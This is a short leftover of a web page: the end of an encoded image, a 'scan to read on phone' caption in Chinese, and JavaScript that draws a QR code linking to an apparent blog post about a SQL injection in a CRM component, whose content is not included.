1E3rwQes5rZpROBr0W+jhrIHIQqJzNvR0bzQuHgVi08TUnsAfymnNfrvqlA4F4TIG2oB7DlVnkvGOj+Y9irXec0T3NAcOPOGuM1s7QmoozrTkY1/zSgXihjZ8/gS8ZCMSk8zZ8UyByEHhHA6GFNeY+9iH0q9j8FXrfQuug76uczPm7CH2fWd2XDGTWeHOfO4FhIJr8ylZLWJ/zELdhlrMOeo21M3RNRYgeQE21t9FOAO11wpzRazqeIUT9LLfi3FdYNeKqDQOpRTv+2RNoA4GYPjzHv9kinP3dB4JbxeJ9k+TLoK8RVw16jXsIq/ZOrDoZRF/5tloPoan8LIbQAvtfLj7e7Ks9IW+2r392O/8DAAD//ypQsXgAAAAGSURBVAMADlj0mLoWXJoAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-ClientCardHandler-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 